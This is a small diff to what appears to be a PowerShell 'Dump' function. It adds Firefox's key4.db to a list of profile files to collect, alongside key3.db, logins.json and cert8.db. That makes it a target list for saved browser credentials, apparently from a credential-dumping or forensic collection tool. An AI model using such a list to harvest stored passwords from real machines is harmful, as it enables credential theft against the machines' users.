@@ -154,6 +154,7 @@ function Dump
 			'name' 	= 'Firefox'
 			'paths'	= @('C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles')
 			'files' = @(
+							'key4.db',
 							'key3.db',
 							'logins.json',
 							'cert8.db'
